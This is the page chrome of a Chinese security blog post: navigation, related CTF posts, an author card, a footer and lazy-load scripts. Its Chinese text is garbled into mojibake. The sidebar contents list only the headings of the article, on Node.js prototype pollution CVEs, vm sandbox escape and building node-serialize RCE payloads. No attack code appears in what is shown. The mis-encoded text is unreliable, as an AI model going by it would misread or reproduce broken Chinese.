title="BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰"><img class="cover" src="/img/loading.gif" data-original="/blog/img/18.jpg" onerror='onerror=null,src="/blog/img/loading.gif"' alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰</div></div></a></div><div class="next-post pull-right"><a href="/blog/2023/10/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BC%80%E5%8F%91/" title="è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘"><img class="cover" src="/img/loading.gif" data-original="/blog/img/1.jpeg" onerror='onerror=null,src="/blog/img/loading.gif"' alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/blog/2023/10/05/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/" title="BUUCTFåˆ·é¢˜ï¼ˆ2ï¼‰"><img class="cover" src="/img/loading.gif" data-original="/blog/img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-05</div><div class="title">BUUCTFåˆ·é¢˜ï¼ˆ2ï¼‰</div></div></a></div><div><a href="/blog/2023/10/04/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89/" title="BUUCTFåˆ·é¢˜ï¼ˆ1ï¼‰"><img class="cover" src="/img/loading.gif" data-original="/blog/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-04</div><div class="title">BUUCTFåˆ·é¢˜ï¼ˆ1ï¼‰</div></div></a></div><div><a href="/blog/2023/10/14/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%883%EF%BC%89/" title="BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰"><img class="cover" src="/img/loading.gif" data-original="/blog/img/18.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-14</div><div class="title">BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰</div></div></a></div><div><a href="/blog/2023/10/17/Golang%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•"><img class="cover" src="/img/loading.gif" data-original="/blog/img/20.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•</div></div></a></div><div><a href="/blog/2023/04/07/NewstarCTF-2022misc/" title="NewstarCTF_2022misc"><img class="cover" src="/img/loading.gif" data-original="https://i.ytimg.com/vi/QxuzfHLPhmI/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGDMgUCh_MA8=&rs=AOn4CLDOr42OYNULHlzMX6yPFeduoFKa2w" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-07</div><div class="title">NewstarCTF_2022misc</div></div></a></div><div><a href="/blog/2023/04/07/NewstarCTF_2022web/" title="NewstarCTF_2022web"><img class="cover" src="/img/loading.gif" data-original="https://images.hdqwalls.com/download/anime-girl-umbrella-rain-4k-ac-2560x1600.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-07</div><div class="title">NewstarCTF_2022web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/blog/img/head%20(1).jpg" onerror='this.onerror=null,this.src="/blog/img/head%20(1).jpg"' alt="avatar"></div><div class="author-info__name">1azy_fish.</div><div class="author-info__description">è§†ä»–äººä¹‹ç–‘ç›®å¦‚ç›ç›é¬¼ç«ï¼Œå¤§èƒ†å»èµ°ä½ çš„å¤œè·¯ã€‚â€”â€”å²é“ç”Ÿã€Šç—…éš™ç¢ç¬”ã€‹</div></div><div class="card-info-data site-data is-center"><a href="/blog/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">20</div></a><a href="/blog/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">3</div></a><a href="/blog/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">æ—¶å…‰çš„æ²™æ¼é‡Œï¼Œç»†æ²™æµèµ°çš„æ˜¯å…‰é˜´ã€‚<br>æ·¡æ·¡æª€é¦™é‡Œï¼Œè£Šè¢…ç‡ƒå°½çš„æ˜¯å…‰é˜´ã€‚<br><img src="/img/loading.gif" data-original="/blog/img/IP.jpg" width="250" alt="æŠ±æ­‰ï¼Œå¯èƒ½æ˜¯æˆ‘çš„åŸå› ï¼Œæ²¡æœ‰åŠ è½½å‡ºæ¥"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#node-js%E9%9A%8F%E4%BE%BF%E5%AD%A6%E4%B8%80%E5%AD%A6%EF%BC%88%E5%85%A5%E9%97%A8%E5%90%91"><span class="toc-number">1.</span> <span class="toc-text">node.jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFnode-js%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">ä»€ä¹ˆæ˜¯node.jsï¼Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-js%E5%92%8Cjs%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">1.2.</span> <span class="toc-text">node.jså’Œjsçš„å…³ç³»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-js%E7%9A%84%E4%B8%80%E4%BA%9Bshell"><span class="toc-number">1.3.</span> <span class="toc-text">node.jsçš„ä¸€äº›shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javascript%E7%89%B9%E6%80%A7"><span class="toc-number">1.4.</span> <span class="toc-text">javascriptç‰¹æ€§</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF"><span class="toc-number">1.5.</span> <span class="toc-text">åŸå‹é“¾ä¸ç»§æ‰¿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.6.</span> <span class="toc-text">åŸå‹é“¾æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E7%B1%BB"><span class="toc-number">1.6.1.</span> <span class="toc-text">mergeç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lodash-%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.6.2.</span> <span class="toc-text">Lodash æ¨¡å—åŸå‹é“¾æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lodash-defaultsDeep-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">lodash.defaultsDeep æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10744ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lodash-merge-x2F-lodash-mergeWith-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">lodash.merge&#x2F;lodash.mergeWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lodash-set-x2F-lodash-setWith-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">lodash.set&#x2F;lodash.setWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Undefsafe-%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10795%EF%BC%89"><span class="toc-number">1.6.3.</span> <span class="toc-text">Undefsafe æ¨¡å—åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10795ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#safe-obj%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2021-25928%EF%BC%89"><span class="toc-number">1.6.4.</span> <span class="toc-text">safe-objåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25928ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#safe-flat%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2021-25927%EF%BC%89"><span class="toc-number">1.6.5.</span> <span class="toc-text">safe-flatåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25927ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E6%98%AF%E5%95%A5%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="toc-number">1.7.</span> <span class="toc-text">vmæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.8.</span> <span class="toc-text">vmæ²™ç®±é€ƒé€¸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E-CVE-2017-5941"><span class="toc-number">1.9.</span> <span class="toc-text">node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.9.1.</span> <span class="toc-text">æ¼æ´è¯¦æƒ…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA-Payload"><span class="toc-number">1.9.2.</span> <span class="toc-text">æ„å»º Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.3.</span> <span class="toc-text">è¿›ä¸€æ­¥åˆ©ç”¨</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/blog/2023/10/17/Golang%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•"><img src="/img/loading.gif" data-original="/blog/img/20.jpg" onerror='this.onerror=null,this.src="/blog/img/loading.gif"' alt="Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•"></a><div class="content"><a class="title" href="/blog/2023/10/17/Golang%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•">Golangçš„ä¸€äº›ç®€å•æ¼æ´æµ‹è¯•</a><time datetime="2023-10-17T09:03:46.000Z" title="å‘è¡¨äº 2023-10-17 17:03:46">2023-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2023/10/14/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%883%EF%BC%89/" title="BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰"><img src="/img/loading.gif" data-original="/blog/img/18.jpg" onerror='this.onerror=null,this.src="/blog/img/loading.gif"' alt="BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰"></a><div class="content"><a class="title" href="/blog/2023/10/14/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%883%EF%BC%89/" title="BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰">BUUCTFåˆ·é¢˜ï¼ˆ3ï¼‰</a><time datetime="2023-10-14T10:58:40.000Z" title="å‘è¡¨äº 2023-10-14 18:58:40">2023-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/" title="node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼"><img src="/img/loading.gif" data-original="/blog/img/9.jpg" onerror='this.onerror=null,this.src="/blog/img/loading.gif"' alt="node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼"></a><div class="content"><a class="title" href="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/" title="node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼">node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼</a><time datetime="2023-10-13T09:06:36.000Z" title="å‘è¡¨äº 2023-10-13 17:06:36">2023-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2023/10/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BC%80%E5%8F%91/" title="è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘"><img src="/img/loading.gif" data-original="/blog/img/1.jpeg" onerror='this.onerror=null,this.src="/blog/img/loading.gif"' alt="è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘"></a><div class="content"><a class="title" href="/blog/2023/10/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BC%80%E5%8F%91/" title="è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘">è®°ä¸€æ¬¡å¤§æ•°æ®æ¨¡å‹å¼€å‘</a><time datetime="2023-10-10T08:01:24.000Z" title="å‘è¡¨äº 2023-10-10 16:01:24">2023-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2023/10/08/%E4%BD%A0%E5%96%9C%E6%AC%A2%E7%9A%84Thinkphp%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="ä½ å–œæ¬¢çš„Thinkphpæ¼æ´æ€»ç»“"><img src="/img/loading.gif" data-original="/blog/img/16.jpg" onerror='this.onerror=null,this.src="/blog/img/loading.gif"' alt="ä½ å–œæ¬¢çš„Thinkphpæ¼æ´æ€»ç»“"></a><div class="content"><a class="title" href="/blog/2023/10/08/%E4%BD%A0%E5%96%9C%E6%AC%A2%E7%9A%84Thinkphp%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="ä½ å–œæ¬¢çš„Thinkphpæ¼æ´æ€»ç»“">ä½ å–œæ¬¢çš„Thinkphpæ¼æ´æ€»ç»“</a><time datetime="2023-10-08T06:08:27.000Z" title="å‘è¡¨äº 2023-10-08 14:08:27">2023-10-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 1azy_fish.</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/blog/js/utils.js"></script><script src="/blog/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><style>[bg-lazy]{background-image:none!important;background-color:#eee!important}</style><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a=c[o],i=function(){c=c.filter(function(t){return a!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(a)};(t=a).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),i()):(e=new Image,n=t.getAttribute("data-original"),e.onload=function(){t.src=n,t.removeAttribute("data-original"),i()},t.src!==n&&(e.src=n))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this)</script></body></html>